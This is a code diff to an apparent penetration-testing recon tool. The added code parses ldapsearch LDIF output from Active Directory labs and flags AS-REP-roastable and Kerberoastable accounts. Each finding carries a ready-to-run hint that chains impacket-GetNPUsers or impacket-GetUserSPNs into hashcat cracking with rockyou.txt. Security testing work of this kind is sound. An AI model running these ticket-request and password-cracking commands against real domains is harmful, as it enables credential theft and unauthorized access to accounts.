@@ -2202,6 +2202,33 @@ _TOMCAT_MANAGER_PATH = re.compile(
     r'(?:manager|host-manager)/(?:html|text|status)'
 )
 
+# iter-244: AS-REP-eligible user extraction from captured ldapsearch
+# LDIF text. JSON ldapdomaindump output is handled by the dedicated
+# ingester; this catches raw `ldapsearch` text output shape:
+#   dn: CN=alice,CN=Users,DC=corp,DC=local
+#   sAMAccountName: alice
+#   userAccountControl: 4260352
+# The UAC value's DONT_REQ_PREAUTH bit (0x400000) = AS-REP-roastable.
+# Kerberoastable via serviceprincipalname is also flagged.
+_LDAP_USER_BLOCK = re.compile(
+    # Intermediate lines must NOT start another `dn:` block - prevents
+    # cross-user span where user A's sAMAccountName gets paired with
+    # user B's userAccountControl. Negative-lookahead pattern from
+    # iter-224 SMB anon-share fix.
+    r'(?im)^dn:\s*CN=([^,\r\n]{1,60}),[^\r\n]{0,300}\r?\n'
+    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
+    r'sAMAccountName:\s+([\w.\-$]{1,60})\s*\r?\n'
+    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
+    r'userAccountControl:\s+(\d+)'
+)
+_LDAP_SPN_BLOCK = re.compile(
+    r'(?im)^dn:\s*CN=[^,\r\n]{1,60},[^\r\n]{0,300}\r?\n'
+    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
+    r'sAMAccountName:\s+([\w.\-$]{1,60})\s*\r?\n'
+    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
+    r'servicePrincipalName:\s+([^\r\n]{5,200})'
+)
+
 # iter-227: LDAP anonymous bind confirmed via rootDSE dump. On AD
 # labs the anonymous bind + rootDSE read gives:
 #   * defaultNamingContext = DC=corp,DC=local        (target domain)
@@ -3079,6 +3106,53 @@ def _multiline_passes(path, report, store):
                 text[:16384])
             _ldap_ip = (_ldap_host_m.group(1) if _ldap_host_m
                          else _dc_fqdn)
+            # iter-244: extract AS-REP-eligible and kerberoastable
+            # users from captured ldapsearch LDIF text. Runs before
+            # emitting the rootDSE finding since the LDIF fields
+            # only appear when the operator queried users past bind.
+            _asrep_seen = set()
+            _dc_ip_for_hint = _ldap_ip
+            _dom_for_hint = (
+                _dc_fqdn.split('.', 1)[-1]
+                if '.' in _dc_fqdn else '<domain>')
+            for _um in _LDAP_USER_BLOCK.finditer(text[:65536]):
+                _sam = _um.group(2).strip()
+                try:
+                    _uac = int(_um.group(3))
+                except (ValueError, TypeError):
+                    continue
+                if _uac & 0x400000 and _sam not in _asrep_seen:
+                    _asrep_seen.add(_sam)
+                    _sam_sh = _sam.replace("'", "'\\''")
+                    report.add("HIGH", "RECON", path, _ln(_um),
+                               f"AS-REP-eligible user (UAC "
+                               f"DONT_REQ_PREAUTH): {_sam}",
+                               hint=(f"impacket-GetNPUsers "
+                                     f"{_dom_for_hint}/ -dc-ip "
+                                     f"{_dc_ip_for_hint} -usersfile "
+                                     f"<(echo '{_sam_sh}') -request "
+                                     f"-no-pass 2>/dev/null | tee "
+                                     f"{_sam}.asrep  |  hashcat -m "
+                                     f"18200 {_sam}.asrep rockyou.txt "
+                                     f"-r rules/best64.rule"))
+            _spn_seen = set()
+            for _sm in _LDAP_SPN_BLOCK.finditer(text[:65536]):
+                _sam_s = _sm.group(1).strip()
+                _spn = _sm.group(2).strip()[:80]
+                if _sam_s in _spn_seen:
+                    continue
+                _spn_seen.add(_sam_s)
+                _sam_s_sh = _sam_s.replace("'", "'\\''")
+                report.add("HIGH", "RECON", path, _ln(_sm),
+                           f"Kerberoastable service account: {_sam_s} "
+                           f"(SPN: {_spn})",
+                           hint=(f"needs any-domain-user cred: "
+                                 f"impacket-GetUserSPNs {_dom_for_hint}/"
+                                 f"<user>:<pw> -dc-ip {_dc_ip_for_hint}"
+                                 f" -request -outputfile {_sam_s}.tgs"
+                                 f"  |  hashcat -m 13100 {_sam_s}.tgs "
+                                 f"rockyou.txt -r rules/best64.rule"))
+
             report.add("HIGH", "SECRET-SIDECHANNEL", path,
                        _ln(_anchor_l),
                        f"LDAP anonymous bind confirmed - rootDSE "
